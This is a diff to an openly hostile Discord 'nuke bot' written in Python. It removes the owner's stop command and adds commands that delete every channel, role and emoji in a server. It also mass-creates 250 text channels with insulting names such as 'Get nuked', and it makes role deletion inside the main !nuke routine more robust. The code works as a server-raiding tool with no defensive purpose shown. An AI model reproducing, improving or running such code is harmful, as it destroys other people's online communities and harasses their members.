@@ -9,25 +9,10 @@ from discord.ext import commands
 client = commands.Bot('!')
 
 tc_names = ['Get nuked', 'be nice to me', 'your fault', 'stupid fn kid']
-r_names = ['works...']
+r_names = ['This is a bitch', 'fortnite kiddo', 'get a life']
 
 
 
-@client.command()
-async def stop(ctx):
-
-        snowie = await client.fetch_user(742448957900455957)
-
-        if ctx.author == snowie:
-
-                await ctx.bot.logout()
-                print("The bot stopped...")
-
-        else:
-                return
-
-        
-        
 @client.command()
 async def channels(ctx):
 
@@ -40,14 +25,68 @@ async def channels(ctx):
                 print(Fore.RED + f"Channel: {channel} was NOT Deleted")
 
         try:
-                for i in range(1):
-                        role = await ctx.guild.create_role(name=random.choice(r_names))
-                        print(Fore.GREEN + f"Role: {role} has been created.")
+                for i in range(250):
+                        channel = await ctx.guild.create_text_channel(random.choice(tc_names))
+                        print(Fore.GREEN + f"Channel: {channel} was created" + Fore.RESET)
 
         except:
-                print(Fore.RED + f"Role: {role} has NOT been created.")
+                print(Fore.RED + f"Channel: {channel} has NOT been created." + Fore.RESET)
 
-                
+
+
+@client.command()
+async def delete_channels(ctx):
+        
+        try:
+                for channel in ctx.guild.channels:
+                        await channel.delete()
+                        print(Fore.GREEN + f"Channel: {channel} was deleted.")
+
+        except:
+                print(Fore.RED + f"Channel: {channel} was NOT Deleted")
+
+
+
+@client.command()
+async def create_channels(ctx):
+        
+        try:
+                for i in range(250):
+                        channel = await ctx.guild.create_text_channel(random.choice(tc_names))
+                        print(Fore.GREEN + f"Channel: {channel} was created" + Fore.RESET)
+
+        except:
+                print(Fore.RED + f"Channel: {channel} has NOT been created." + Fore.RESET)
+
+
+
+
+@client.command()
+async def emojis(ctx):
+
+        try:
+                for emoji in list(ctx.guild.emojis):
+                        await emoji.delete()
+                        print(Fore.GREEN + f"Emoji: {emoji.name} has been deleted." + Fore.RESET)
+
+        except:
+                print(Fore.RED + f"Emoji: {emoji.name} has NOT been deleted." + Fore.RESET)
+
+
+
+@client.command()
+async def delete_roles(ctx):
+
+        for role in ctx.guild.roles:
+                try:
+                        await role.delete()
+                        print(Fore.GREEN +f"Role: {role} has been deleted.")
+
+                except:
+                        print(Fore.RED + f"Role: {role} has NOT been deleted.")
+
+
+
 
 @client.command()
 async def nuke(ctx):
@@ -86,13 +125,13 @@ async def nuke(ctx):
         print(Fore.GREEN +
         "\n--------------------------------------------------------------------------------------------------------\n  Entering deleting roles. \n--------------------------------------------------------------------------------------------------------\n")
 
-        try:
-                for role in ctx.guild.roles:
+        for role in ctx.guild.roles:
+                try:
                         await role.delete()
                         print(Fore.GREEN +f"Role: {role} has been deleted.")
 
-        except:
-                print(Fore.RED + f"Role: {role} has NOT been deleted.")
+                except:
+                        print(Fore.RED + f"Role: {role} has NOT been deleted.")
 
         print(Fore.GREEN +
         "\n--------------------------------------------------------------------------------------------------------\n  Entering editing the server. \n--------------------------------------------------------------------------------------------------------\n")
@@ -148,19 +187,21 @@ async def on_guild_channel_create(channel):
 @client.event
 async def on_ready():
         print(Fore.GREEN + f"""
-███╗░░██╗██╗░░░██╗██╗░░██╗███████╗  ██████╗░░█████╗░████████╗░░░██╗░██╗░░█████╗░░█████╗░░█████╗░░█████╗░
-████╗░██║██║░░░██║██║░██╔╝██╔════╝  ██╔══██╗██╔══██╗╚══██╔══╝██████████╗██╔══██╗██╔══██╗██╔═══╝░██╔══██╗
-██╔██╗██║██║░░░██║█████═╝░█████╗░░  ██████╦╝██║░░██║░░░██║░░░╚═██╔═██╔═╝╚██████║╚█████╔╝██████╗░╚██████║
-██║╚████║██║░░░██║██╔═██╗░██╔══╝░░  ██╔══██╗██║░░██║░░░██║░░░██████████╗░╚═══██║██╔══██╗██╔══██╗░╚═══██║
-██║░╚███║╚██████╔╝██║░╚██╗███████╗  ██████╦╝╚█████╔╝░░░██║░░░╚██╔═██╔══╝░█████╔╝╚█████╔╝╚█████╔╝░█████╔╝
-╚═╝░░╚══╝░╚═════╝░╚═╝░░╚═╝╚══════╝  ╚═════╝░░╚════╝░░░░╚═╝░░░░╚═╝░╚═╝░░░░╚════╝░░╚════╝░░╚════╝░░╚════╝░
+███╗░░██╗██╗░░░██╗██╗░░██╗███████╗  ██████╗░░█████╗░████████╗  ██████╗░███████╗░█████╗░██████╗░██╗░░░██╗
+████╗░██║██║░░░██║██║░██╔╝██╔════╝  ██╔══██╗██╔══██╗╚══██╔══╝  ██╔══██╗██╔════╝██╔══██╗██╔══██╗╚██╗░██╔╝
+██╔██╗██║██║░░░██║█████═╝░█████╗░░  ██████╦╝██║░░██║░░░██║░░░  ██████╔╝█████╗░░███████║██║░░██║░╚████╔╝░
+██║╚████║██║░░░██║██╔═██╗░██╔══╝░░  ██╔══██╗██║░░██║░░░██║░░░  ██╔══██╗██╔══╝░░██╔══██║██║░░██║░░╚██╔╝░░
+██║░╚███║╚██████╔╝██║░╚██╗███████╗  ██████╦╝╚█████╔╝░░░██║░░░  ██║░░██║███████╗██║░░██║██████╔╝░░░██║░░░
+╚═╝░░╚══╝░╚═════╝░╚═╝░░╚═╝╚══════╝  ╚═════╝░░╚════╝░░░░╚═╝░░░  ╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝╚═════╝░░░░╚═╝░░░
 \n--------------------------------------------------------------------------------------------------------\n
 {client.user.name}#{client.user.discriminator}
 \n--------------------------------------------------------------------------------------------------------\n
 !nuke
 !emoji
-!roles
 !channels
+!delete_roles
+!create_channels
+!delete_channels
 \n--------------------------------------------------------------------------------------------------------\n""")
 
 
